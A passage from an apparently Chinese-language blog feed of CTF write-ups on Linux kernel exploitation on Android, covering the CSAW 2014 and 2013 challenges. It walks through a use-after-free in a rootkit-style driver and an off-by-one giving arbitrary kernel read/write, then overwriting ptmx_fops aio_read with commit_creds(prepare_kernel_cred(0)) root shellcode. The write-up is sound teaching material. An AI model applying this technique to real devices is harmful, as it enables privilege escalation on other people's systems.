class="title">hidden_pid</span> *<span class="title">hp</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *endp;</span><br><span class="line">    <span class="keyword">long</span> pid;</span><br><span class="line"></span><br><span class="line">    DEBUG(<span class="string">"%s: enter, name=%s\n"</span>, __func__, name);</span><br><span class="line"></span><br><span class="line">    pid = simple_strtol(name, &amp;endp, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    list_for_each_entry ( hp, &amp;hidden_pids, <span class="built_in">list</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        DEBUG(<span class="string">"Checking name against: %ld-%ld\n"</span>, hp-&gt;pid_start, hp-&gt;pid_end);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( (pid &gt;= hp-&gt;pid_start) &amp;&amp; (pid &lt;= hp-&gt;pid_end) )</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> proc_filldir(__buf, name, namelen, offset, ino, d_type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hook_root_filldir</span><span class="params">( <span class="keyword">void</span> *__buf, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">int</span> namelen, <span class="keyword">loff_t</span> offset, u64 ino, <span class="keyword">unsigned</span> d_type )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hidden_file</span> *<span class="title">hf</span>;</span></span><br><span class="line"></span><br><span class="line">    DEBUG(<span class="string">"%s: enter, name=%s\n"</span>, __func__, name);</span><br><span class="line"></span><br><span class="line">    list_for_each_entry ( hf, &amp;hidden_files, <span class="built_in">list</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        DEBUG(<span class="string">"Checking name against: '%s' with callback %p\n"</span>, hf-&gt;name, hf-&gt;cb);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strstr</span>(name, hf-&gt;name) )</span><br><span class="line">        &#123;</span><br><span class="line">            DEBUG(<span class="string">"Match!\n"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( hf-&gt;cb )</span><br><span class="line">                hf-&gt;cb(hf);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DEBUG(<span class="string">"%s: end\n"</span>, __func__);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> root_filldir(__buf, name, namelen, offset, ino, d_type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以,当我们执行readdir()函数的时候,readdir函数在内部使用fillonedir回调函数,所以我们的hook_proc_filldir和hook_root_filldir会被执行.</p><h3 id="UAF漏洞处"><a href="#UAF漏洞处" class="headerlink" title="UAF漏洞处"></a>UAF漏洞处</h3><p>在hook_sys_shmctl中,可以通过cmd进行进程的隐藏,进程的恢复,文件的隐藏,文件的恢复等功能.<br>我们看一下unhide_file函数.再对比一下unhide_pid,可以发现一个问题,我们将file,free之后,并没有将其从list中删除,我们仍然可以通过它的name在list中获取它.我们观察hook_root_filldir函数,因为我们没有在 list中删除我们刚free掉的文件,通过name我们仍然可以调用到它的hf-&gt;cb函数,这本来是一个debug函数.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unhide_file</span> <span class="params">( <span class="keyword">char</span> *name )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hidden_file</span> *<span class="title">hf</span>;</span></span><br><span class="line"></span><br><span class="line">    list_for_each_entry ( hf, &amp;hidden_files, <span class="built_in">list</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( ! <span class="built_in">strcmp</span>(name, hf-&gt;name) )</span><br><span class="line">        &#123;</span><br><span class="line">            suckerusu_kfree(hf-&gt;name);</span><br><span class="line">            suckerusu_kfree(hf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unhide_pid</span> <span class="params">( <span class="keyword">long</span> pid_start, <span class="keyword">long</span> pid_end )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hidden_pid</span> *<span class="title">hp</span>;</span></span><br><span class="line"></span><br><span class="line">    list_for_each_entry ( hp, &amp;hidden_pids, <span class="built_in">list</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (pid_start == hp-&gt;pid_start) &amp;&amp; (pid_end == hp-&gt;pid_end) )</span><br><span class="line">        &#123;</span><br><span class="line">            list_del(&amp;hp-&gt;<span class="built_in">list</span>);</span><br><span class="line">            suckerusu_kfree(hp);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>好了,前途一片光明,UAF就可以了,我们发现hidden_pid和hidden_file是一个同样大小的.那么就很好办了.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hidden_pid</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> pid_start;</span><br><span class="line">    <span class="keyword">long</span> pid_end;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hidden_file</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> (*cb)(struct hidden_file *);</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>流程大致如下:</p><ol><li>hide_file函数调用 - &gt;内存分配</li><li>unhide_file函数调用 - &gt;内存返回</li><li>hide_pid函数调用 - &gt;内存分配 - &gt; hf-&gt; cb覆盖区域(将其设置为upup函数地址)</li><li>调用readdir即可.</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blackperl-security.gitlab.io/blog/2018/06/22/2018-06-22-csaw2014-kernelex/" target="_blank" rel="noopener">https://blackperl-security.gitlab.io/blog/2018/06/22/2018-06-22-csaw2014-kernelex/</a><br><a href="http://www.freebuf.com/articles/system/108392.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/108392.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;题目也很长,但是功能也就那一些,这个内核驱动的目的是一个内核的hook,达到rootkit的目的,当然,题目没有做实际的rootkit,只是
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux Kernel Exploitation on Android-csaw2013</title>
    <link href="https://foyjog.github.io/2018/07/02/Linux-Kernel-Exploitation-on-Android-csaw2013/"/>
    <id>https://foyjog.github.io/2018/07/02/Linux-Kernel-Exploitation-on-Android-csaw2013/</id>
    <published>2018-07-02T14:34:29.000Z</published>
    <updated>2018-07-03T08:18:12.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这道题目总体来说比之前的更需要时间阅读代码,但是只要了解了代码的作用,找到了点,利用起来其实并不是很麻烦.整体上是一个off-by-one的漏洞类型,只要通过溢出一个4字节的long数据,即可达到更改任意地址和读取任意地址的效果.</p><p>题目是一个提供一个内核缓冲区的作用,主要的输入输出在ioctl的控制层面上,我们一个个看.</p><h3 id="CSAW-ALLOC-HANDLE"><a href="#CSAW-ALLOC-HANDLE" class="headerlink" title="CSAW_ALLOC_HANDLE"></a>CSAW_ALLOC_HANDLE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> CSAW_ALLOC_HANDLE:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> ret;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">alloc_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( copy_from_user(&amp;alloc_args, argp, <span class="keyword">sizeof</span>(alloc_args)) )</span><br><span class="line">                <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( (ret = alloc_buf(&amp;alloc_args)) &lt; <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( copy_to_user(argp, &amp;alloc_args, <span class="keyword">sizeof</span>(alloc_args)) )</span><br><span class="line">                <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">            handles++;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>输入参数,然后通过alloc_buf分配一个内核buf.</p><h3 id="alloc-buf"><a href="#alloc-buf" class="headerlink" title="alloc_buf"></a>alloc_buf</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">alloc_buf</span> <span class="params">( struct alloc_args *alloc_args )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">csaw_buf</span> *<span class="title">cbuf</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> size, seed, handle;</span><br><span class="line"></span><br><span class="line">    size = alloc_args-&gt;size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( ! size )</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    cbuf = kmalloc(<span class="keyword">sizeof</span>(*cbuf), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> ( ! cbuf )</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">    buf = kzalloc(size, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> ( ! buf )</span><br><span class="line">    &#123;</span><br><span class="line">        kfree(cbuf);</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cbuf-&gt;buf = buf;</span><br><span class="line">    cbuf-&gt;size = size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;cbuf-&gt;consumers, <span class="number">0</span>, <span class="keyword">sizeof</span>(cbuf-&gt;consumers));</span><br><span class="line">    cbuf-&gt;consumers[<span class="number">0</span>] = current-&gt;pid;</span><br><span class="line"></span><br><span class="line">    get_random_bytes(&amp;seed, <span class="keyword">sizeof</span>(seed));</span><br><span class="line"></span><br><span class="line">    cbuf-&gt;seed = seed;</span><br><span class="line"></span><br><span class="line">    handle = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buf ^ seed;</span><br><span class="line"></span><br><span class="line">    list_add(&amp;cbuf-&gt;<span class="built_in">list</span>, &amp;csaw_bufs);</span><br><span class="line"></span><br><span class="line">    alloc_args-&gt;handle = handle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过输入的size分配一块内存,然后返回一个handle=buf ^ seed.</p><h3 id="CSAW-READ-HANDLE和CSAW-WRITE-HANDLE"><a href="#CSAW-READ-HANDLE和CSAW-WRITE-HANDLE" class="headerlink" title="CSAW_READ_HANDLE和CSAW_WRITE_HANDLE"></a>CSAW_READ_HANDLE和CSAW_WRITE_HANDLE</h3><p> 这两个函数是输入输出,即负责读取和修改内核区域的buf缓冲区.</p><h3 id="CSAW-SET-CONSUMER和CSAW-GET-CONSUMER"><a href="#CSAW-SET-CONSUMER和CSAW-GET-CONSUMER" class="headerlink" title="CSAW_SET_CONSUMER和CSAW_GET_CONSUMER"></a>CSAW_SET_CONSUMER和CSAW_GET_CONSUMER</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> CSAW_SET_CONSUMER:</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="class"><span class="keyword">struct</span> <span class="title">consumer_args</span> <span class="title">consumer_args</span>;</span></span><br><span class="line">           <span class="class"><span class="keyword">struct</span> <span class="title">csaw_buf</span> *<span class="title">cbuf</span>;</span></span><br><span class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> i, authorized = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> ( copy_from_user(&amp;consumer_args, argp, <span class="keyword">sizeof</span>(consumer_args)) )</span><br><span class="line">               <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">           cbuf = find_cbuf(consumer_args.handle);</span><br><span class="line">           <span class="keyword">if</span> ( ! cbuf )</span><br><span class="line">               <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; MAX_CONSUMERS; i++ )</span><br><span class="line">                <span class="keyword">if</span> ( current-&gt;pid == cbuf-&gt;consumers[i] )</span><br><span class="line">                   authorized = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> ( ! authorized )</span><br><span class="line">               <span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">           cbuf-&gt;consumers[consumer_args.offset] = consumer_args.pid;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>这里便是漏洞所在的地方了,下面这一句存在着一个off-by-one的漏洞可供利用.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cbuf-&gt;consumers[consumer_args.offset] = consumer_args.pid;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">csaw_buf</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> consumers[MAX_CONSUMERS];</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> seed;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">consumer_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> handle;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pid;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> offset;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到consumer_args.offset是一个char类型,值在0-255之间,如果offset为255的话,MAX_CONSUMERS也是255,那么consumers[255]其实是buf的地址.(关键点)<br>所以通过将offset设置为255,利用CSAW_SET_CONSUMER和CSAW_GET_CONSUMER就可以对buf的地址进行泄漏和修改.</p><p>修改了buf的地址,我们通过CSAW_READ_HANDLE和CSAW_WRITE_HANDLE就可以实现对任意地址的泄漏和修改.</p><p>但是如果我们修改了buf的地址,就无法利用原来的handle通过find_cbuf来再次接触到buf了,所以,我们还需要通过泄漏buf的地址来修改seed达到控制handle的效果.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct csaw_buf *<span class="title">find_cbuf</span> <span class="params">( <span class="keyword">unsigned</span> <span class="keyword">long</span> handle )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">csaw_buf</span> *<span class="title">cbuf</span>;</span></span><br><span class="line"></span><br><span class="line">    list_for_each_entry ( cbuf, &amp;csaw_bufs, <span class="built_in">list</span> )</span><br><span class="line">        <span class="keyword">if</span> ( handle == ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)cbuf-&gt;buf ^ cbuf-&gt;seed) )</span><br><span class="line">            <span class="keyword">return</span> cbuf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><p>得到了读写任意地址的机会,接下来就比较好办了,有几种常用的方法进行提权,这里使用ptmx的ptmx_fops就可以做到提权了.<br>ptmx的fops如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">    <span class="keyword">loff_t</span> (*llseek) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*aio_read) (struct kiocb *, <span class="keyword">const</span> struct iovec *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">loff_t</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*aio_write) (struct kiocb *, <span class="keyword">const</span> struct iovec *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">loff_t</span>);</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure></p><p>如果调用readv()读取ptmx设备的话,他的调用顺序如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readv-&gt;vfs_readv-&gt;do_readv_writev-&gt;do_sync_readv_writev-&gt;fn(...);</span><br></pre></td></tr></table></figure></p><p>fn的地址是f_op-&gt;aio_read的地址,那么就很简单了,更改aio_read的地址,然后将其设置为提权shellcode即可,这在exp中显示的非常清楚.</p><p>我觉得这个exp写的非常好,shellcode布局利用c语言来进行布局,省去我们关心栈上的问题.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_root</span> <span class="params">( <span class="keyword">void</span> *iocb, <span class="keyword">const</span> struct iovec *iov, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_segs, <span class="keyword">loff_t</span> pos )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _commit_creds commit = (_commit_creds)commit_creds;</span><br><span class="line">    _prepare_kernel_cred prepare = (_prepare_kernel_cred)prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line">    *cleanup = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    commit(prepare(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>布置参数,和aio_read一样,这样即能省去布置的任务,也能保证shellcode的顺利执行并且回到我们的用户区中来.</p><h3 id="关于LIST-HEAD"><a href="#关于LIST-HEAD" class="headerlink" title="关于LIST_HEAD"></a>关于LIST_HEAD</h3><p>通过gdb的观察能够很清晰的发现LIST_HEAD的关系<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ print *(struct csaw_buf *) <span class="number">0xecb5f000</span></span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  consumers = &#123;<span class="number">0x462</span>, <span class="number">0x0</span> &lt;repeats <span class="number">254</span> times&gt;&#125;,</span><br><span class="line">  buf = <span class="number">0xc04f791c</span> &lt;ptmx_fops+<span class="number">16</span>&gt; <span class="string">""</span>,</span><br><span class="line">  size = <span class="number">0x100</span>,</span><br><span class="line">  seed = <span class="number">0x63ddff48</span>,</span><br><span class="line">  <span class="built_in">list</span> = &#123;</span><br><span class="line">    next = <span class="number">0xc04ac2f4</span> &lt;csaw_bufs&gt;,</span><br><span class="line">    prev = <span class="number">0xc04ac2f4</span> &lt;csaw_bufs&gt;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$ print csaw_bufs</span><br><span class="line">$<span class="number">5</span> = &#123;</span><br><span class="line">  next = <span class="number">0xecb5f408</span>,</span><br><span class="line">  prev = <span class="number">0xecb5f408</span></span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$ print *<span class="number">0xecb5f408</span></span><br><span class="line">$<span class="number">6</span> = <span class="number">0xc04ac2f4</span></span><br><span class="line">gdb-peda$ print *<span class="number">0xc04f791c</span></span><br><span class="line">$<span class="number">7</span> = <span class="number">0x0</span></span><br></pre></td></tr></table></figure></p><h3 id="ptmx-fops的地址"><a href="#ptmx-fops的地址" class="headerlink" title="ptmx_fops的地址"></a>ptmx_fops的地址</h3><p>我试了一些系统,发现有些在vmlinux中有这个,通过kallsyms来查看,但是我试的环境没有.</p><ol><li>我通过gdb attach之后可以直接拿到.</li><li>通过具体偏移来定位点,查看源码/drivers/tty/pty.c可以看到:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">pty_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">legacy_pty_init();</span><br><span class="line">unix98_pty_init();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>通过查看pty_init的地址然后通过偏移计算出ptmx_fops的地址.</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blackperl-security.gitlab.io/blog/2018/06/08/2018-06-08-csaw2013-kernelex/" target="_blank" rel="noopener">https://blackperl-security.gitlab.io/blog/2018/06/08/2018-06-08-csaw2013-kernelex/</a><br><a href="https://blog.csdn.net/babyzhaoshu521/article/details/60881951" target="_blank" rel="noopener">https://blog.csdn.net/babyzhaoshu521/article/details/60881951</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;这道题目总体来说比之前的更需要时间阅读代码,但是只要了解了代码的作用,找到了点,利用起来其实并不是很麻烦.整体上是一个off-by-one的
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux Kernel Exploitation on Android-csaw2011</title>
    <link href="https://foyjog.github.io/2018/06/29/Linux-Kernel-Exploitation-on-Android-csaw2011/"/>
    <id>https://foyjog.github.io/2018/06/29/Linux-Kernel-Exploitation-on-Android-csaw2011/</id>
    <published>2018-06-29T08:08:34.000Z</published>
    <updated>2018-07-03T08:17:52.000Z</updated>
    
